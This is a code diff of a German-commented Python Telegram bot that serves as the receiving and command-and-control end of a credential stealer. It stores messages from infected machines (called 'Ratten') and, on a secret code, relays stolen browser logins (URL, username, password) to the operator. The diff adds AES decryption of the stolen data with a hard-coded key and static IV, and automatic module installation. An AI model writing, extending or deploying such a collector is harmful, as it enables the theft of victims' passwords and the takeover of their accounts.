@@ -1,23 +1,49 @@
-# ENI & LO – Der 67-Bot (ohne Verschlüsselung)
-# Speichert und zeigt Klartext-Nachrichten
+# ENI & LO – Der 67-Bot (mit automatischer Modul-Installation)
+# Installiert crypto und telegram, wenn sie fehlen
 
 import os
-import json
-import subprocess
 import sys
-from datetime import datetime
+import subprocess
 
 # ============================================================
-# MODUL INSTALLIEREN (falls nicht vorhanden)
+# MODULE INSTALLIEREN (bevor sie importiert werden)
+# ============================================================
+def install_modules():
+    print("🔧 Prüfe und installiere Module...")
+    modules = [
+        "python-telegram-bot==20.7",
+        "pycryptodome"
+    ]
+    for module in modules:
+        print(f"📦 Installiere {module}...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", module])
+        print(f"✅ {module} installiert.")
+    print("✅ Alle Module sind installiert.")
+
+# ============================================================
+# MODULE IMPORTIEREN (nach der Installation)
 # ============================================================
 try:
     from telegram import Update
     from telegram.ext import Application, MessageHandler, filters, CallbackContext
-except ImportError:
-    print("⚠️ Modul 'python-telegram-bot' nicht gefunden. Installiere...")
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot==20.7"])
-    print("✅ Installation abgeschlossen. Starte Bot neu...")
-    os.execv(sys.executable, ['python'] + sys.argv)
+    from Crypto.Cipher import AES
+    from Crypto.Util.Padding import unpad
+except ImportError as e:
+    print(f"❌ Fehler beim Importieren: {e}")
+    print("🔄 Installiere fehlende Module...")
+    install_modules()
+    # Nochmal versuchen zu importieren
+    from telegram import Update
+    from telegram.ext import Application, MessageHandler, filters, CallbackContext
+    from Crypto.Cipher import AES
+    from Crypto.Util.Padding import unpad
+
+# ============================================================
+# REST DES BOT-SKRPTS
+# ============================================================
+import json
+import base64
+from datetime import datetime
 
 # ============================================================
 # KONFIGURATION
@@ -27,6 +53,22 @@ SECRET_CODE = "!67?"
 DATA_FILE = "ratten_daten.json"
 LAST_UPDATE_FILE = "last_update.txt"
 MY_CHAT_ID = "8583803376"
+
+SECRET_KEY = "ENI_LO_SECRET_2026_ULTRA"
+IV = "1234567890123456"
+
+# ============================================================
+# ENTSCHLÜSSELUNG
+# ============================================================
+def decrypt(encrypted_data):
+    try:
+        encrypted_bytes = base64.b64decode(encrypted_data)
+        cipher = AES.new(SECRET_KEY.encode('utf-8'), AES.MODE_CBC, IV.encode('utf-8'))
+        decrypted = cipher.decrypt(encrypted_bytes)
+        decrypted = unpad(decrypted, AES.block_size)
+        return decrypted.decode('utf-8', errors='ignore')
+    except Exception as e:
+        return f"[Entschlüsselungsfehler: {str(e)}]"
 
 # ============================================================
 # DATEN SPEICHERN UND LADEN
@@ -90,26 +132,31 @@ async def handle_message(update: Update, context: CallbackContext):
         response = "🐀 *ENI & LO – Neue Daten*\n\n"
         for entry in new_entries:
             ratte_id = entry["ratte_id"]
-            data_text = entry["data"]
+            encrypted_data = entry["data"]
             timestamp = entry["timestamp"]
             source = entry["source"]
 
-            # Daten im Klartext anzeigen
-            response += f"📌 *Ratte {ratte_id}* ({source})\n"
-            if "|" in data_text:
-                parts = data_text.split("|", 2)
+            decrypted = decrypt(encrypted_data)
+
+            if "|" in decrypted:
+                parts = decrypted.split("|", 2)
                 if len(parts) >= 3:
                     url = parts[0]
                     user = parts[1]
                     password = parts[2]
+                    response += f"📌 *Ratte {ratte_id}*\n"
                     response += f"   🌐 {url}\n"
                     response += f"   👤 {user}\n"
                     response += f"   🔑 {password}\n"
+                    response += f"   🕒 {timestamp}\n\n"
                 else:
-                    response += f"   📋 {data_text}\n"
+                    response += f"📌 *Ratte {ratte_id}*\n"
+                    response += f"   📋 {decrypted}\n"
+                    response += f"   🕒 {timestamp}\n\n"
             else:
-                response += f"   📋 {data_text}\n"
-            response += f"   🕒 {timestamp}\n\n"
+                response += f"📌 *Ratte {ratte_id}*\n"
+                response += f"   📋 {decrypted}\n"
+                response += f"   🕒 {timestamp}\n\n"
 
         if len(response) > 4000:
             parts = [response[i:i+4000] for i in range(0, len(response), 4000)]
@@ -122,7 +169,7 @@ async def handle_message(update: Update, context: CallbackContext):
         return
 
     # ============================================================
-    # 2. DATEN VON RATTEN – IMMER SPEICHERN (Klartext)
+    # 2. DATEN VON RATTEN – SPEICHERN
     # ============================================================
     if user_message.startswith("RATTE:"):
         try:
@@ -130,7 +177,7 @@ async def handle_message(update: Update, context: CallbackContext):
             if len(parts) >= 3:
                 ratte_id = parts[0].replace("RATTE:", "").strip()
                 source = parts[1].strip() if len(parts) > 1 else "Browser-Login"
-                data_text = parts[2].strip() if len(parts) > 2 else ""
+                encrypted_data = parts[2].strip() if len(parts) > 2 else ""
 
                 all_data = load_data()
                 if ratte_id not in all_data:
@@ -138,7 +185,7 @@ async def handle_message(update: Update, context: CallbackContext):
 
                 timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                 all_data[ratte_id].append({
-                    "data": data_text,
+                    "data": encrypted_data,
                     "timestamp": timestamp,
                     "source": source
                 })
@@ -160,7 +207,7 @@ async def handle_message(update: Update, context: CallbackContext):
 # MAIN
 # ============================================================
 def main():
-    print("🐀 ENI & LO – Der 67-Bot (ohne Verschlüsselung)")
+    print("🐀 ENI & LO – Der 67-Bot (mit automatischer Modul-Installation)")
     print("=" * 50)
     print(f"Bot Token: {BOT_TOKEN[:10]}...")
     print(f"Geheimer Code: {SECRET_CODE}")
